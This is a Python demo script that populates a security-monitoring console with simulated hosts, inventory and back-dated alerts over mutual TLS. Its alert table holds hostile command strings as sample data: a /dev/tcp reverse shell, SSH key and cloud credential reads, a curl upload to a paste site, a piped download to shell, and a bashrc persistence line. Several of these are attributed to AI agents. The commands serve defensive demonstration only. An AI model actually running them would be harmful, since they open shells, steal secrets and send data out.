"""Populate a Wisp console with a realistic demo fleet.

Connects simulated sensors over mutual TLS and speaks the real agent wire
protocol (hello, heartbeat, inventory, alert). Alerts are back-dated across
the last 24 hours so every console view has something to show. Used for the
docs screenshots and for trying the console without deploying sensors.

    python3 bench/demo_fleet.py [--console 127.0.0.1:8750] [--seconds 600]
                                [--pki DIR]

The simulated hosts stay connected for --seconds, then disconnect (they go
stale in the console, as real hosts would).
"""
import argparse, json, os, random, socket, ssl, threading, time

ap = argparse.ArgumentParser()
ap.add_argument("--console", default="127.0.0.1:8750")
ap.add_argument("--seconds", type=float, default=600)
ap.add_argument("--pki", default=os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "pki"))
ap.add_argument("--seed", type=int, default=7)
args = ap.parse_args()
rnd = random.Random(args.seed)
chost, cport = args.console.rsplit(":", 1)

RULES = [  # (rule, severity, mitre, title, actor, cmd)
    ("CRED-001", "high", "T1552.001", "Read of SSH private key", "ai", "cat /home/dev/.ssh/id_ed25519"),
    ("CRED-002", "high", "T1555", "Cloud credential file access", "code", "python3 sync.py --profile ~/.aws/credentials"),
    ("AI-001", "medium", "", "AI agent executed a shell", "ai", "bash -lc 'npm test && git status'"),
    ("AI-003", "high", "T1071", "AI agent initiated network transfer", "ai", "curl -s -X POST https://paste.example/api -d @build.log"),
    ("PKG-001", "high", "T1195.001", "Install with arbitrary pre/post-install script flag", "human", "npm install --unsafe-perm left-pad-ng"),
    ("PKG-002", "medium", "T1195", "pip install straight from a URL or VCS", "ci", "pip install git+https://github.com/example/utils@main"),
    ("LOL-003", "low", "T1087", "Account/host discovery burst", "ai", "whoami; id; hostname; uname -a"),
    ("RSHELL-02", "high", "T1059", "Piped download to shell", "human", "curl -fsSL https://get.example.sh | sh"),
    ("PERSIST-02", "medium", "T1547.001", "Shell rc file modified", "code", "sh -c 'echo export PATH=/tmp/.x:$PATH >> ~/.bashrc'"),
    ("CAT-NPM", "high", "T1195.002", "Package not in the curated catalog", "ci", "npm install event-stream@3.3.6"),
    ("ANOM-001", "medium", "T1204", "First execution of a program never seen on this host", "ai", "/tmp/.cache/kworkerd --daemon"),
    ("NET-RATE", "medium", "T1498", "Outbound connection rate over API limit", "ai", ""),
    ("RSHELL-01", "critical", "T1059.004", "Shell spawned with network redirection", "code", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"),
    ("PRIV-002", "critical", "T1068", "Known exploit helper executed", "human", "./linpeas.sh -a"),
]
ACTOR_SRC = {"ai": ["claude", "cursor", "codex"], "human": ["sshd", "tty"], "code": ["node", "python3"], "ci": ["github-runner"], "service": ["systemd"]}

FLEET = (
    [(f"web-{i:02d}", "prod-web", "tpm", "enforce", False) for i in range(1, 9)]
    + [(f"db-{i:02d}", "prod-db", "tpm", "enforce", False) for i in range(1, 4)]
    + [(f"ci-runner-{i:02d}", "ci", "machine-id", "monitor", True) for i in range(1, 6)]
    + [("dev-alex", "dev-laptops", "dmi", "monitor", False), ("dev-sam", "dev-laptops", "dmi", "monitor", False),
       ("dev-kim", "dev-laptops", "generated", "monitor", False), ("dev-ravi", "dev-laptops", "dmi", "monitor", False)]
)
INVENTORY = {
    "web": [("npm", "express", "4.19.2"), ("npm", "lodash", "4.17.15"), ("npm", "ws", "7.4.5")],
    "db": [("pip", "pyyaml", "5.3.1"), ("pip", "requests", "2.31.0")],
    "ci": [("npm", "event-stream", "3.3.6"), ("npm", "minimist", "1.2.5")],
    "dev": [("vsx", "ms-python.python", "2024.8.0"), ("npm", "lodash", "4.17.21"), ("pip", "ctx", "0.1.2"), ("ai", "claude-code", "2.1.3")],
}


def ts(t):
    return time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime(t))


def run_host(idx, name, group, trust, mode, ephemeral):
    ctx = ssl.create_default_context(cafile=f"{args.pki}/ca.crt")
    ctx.verify_flags &= ~ssl.VERIFY_X509_STRICT  # the repo's dev CA predates keyUsage
    ctx.load_cert_chain(f"{args.pki}/agent.crt", f"{args.pki}/agent.key")
    s = ctx.wrap_socket(socket.create_connection((chost, int(cport))), server_hostname="localhost")
    send = lambda o: s.sendall((json.dumps(o) + "\n").encode())
    hr = random.Random(args.seed * 1000 + idx)
    send({"type": "hello", "host": name, "group": group, "version": "1.0.0", "host_id": f"{trust}-{hr.getrandbits(48):012x}",
          "trust": trust, "ephemeral": ephemeral})
    kind = group.split("-")[-1] if group.startswith("prod") else group.split("-")[0]
    kind = {"web": "web", "db": "db", "ci": "ci", "dev": "dev"}.get(kind, "web")
    for eco, pkg, ver in INVENTORY[kind]:
        send({"ts": ts(time.time() - hr.randint(3600, 86400 * 3)), "type": "inventory", "host": name, "kind": eco, "name": pkg,
              "version": ver, "where": f"/srv/app/node_modules/{pkg}" if eco == "npm" else "/usr/lib/python3/site-packages", "change": "present"})
    # back-dated alerts: busier on dev laptops and CI, quieter on servers
    n = {"dev": 9, "ci": 7, "web": 3, "db": 1}[kind]
    now = time.time()
    for _ in range(n):
        rule, sev, mitre, title, actor, cmd = hr.choice(RULES if kind in ("dev", "ci") else RULES[:2] + RULES[6:9])
        a = {"ts": ts(now - hr.uniform(60, 86400)), "type": "alert", "host": name, "group": group, "rule": rule, "mitre": mitre,
             "title": title, "severity": sev, "action": "blocked" if mode == "enforce" and sev in ("high", "critical") else "alert",
             "actor": actor, "actor_src": hr.choice(ACTOR_SRC[actor]), "pid": hr.randint(2000, 60000), "ppid": hr.randint(900, 2000),
             "uid": 1000 if kind == "dev" else 0, "comm": (cmd.split() or ["node"])[0].split("/")[-1], "exe": "", "cmd": cmd}
        if rule == "NET-RATE":
            a.update({"dest": "198.51.100.23", "dport": 443})
        send(a)
    runtimes = {"web": ["npm"], "db": ["pip"], "ci": ["npm", "pip"], "dev": ["npm"]}[kind]
    cpu_base = {"web": 0.012, "db": 0.006, "ci": 0.031, "dev": 0.019}[kind]
    end = time.time() + args.seconds
    s.settimeout(0.5)
    while time.time() < end:
        send({"ts": ts(time.time()), "type": "heartbeat", "host": name, "group": group, "execs": hr.randint(1000, 90000),
              "alerts_total": n, "cpu_pct": round(max(0.001, hr.gauss(cpu_base, cpu_base * 0.25)), 4), "rss_kb": hr.randint(6400, 8200),
              "mode": mode, "runtimes": runtimes})
        try:
            s.recv(4096)  # control pushes are acknowledged by staying connected
        except (socket.timeout, ssl.SSLWantReadError):
            pass
        time.sleep(4.5)
    s.close()


threads = [threading.Thread(target=run_host, args=(i, *h), daemon=True) for i, h in enumerate(FLEET)]
for t in threads:
    t.start()
    time.sleep(0.03)
print(f"demo fleet: {len(FLEET)} hosts connected to {args.console} for {args.seconds:.0f}s")
for t in threads:
    t.join()
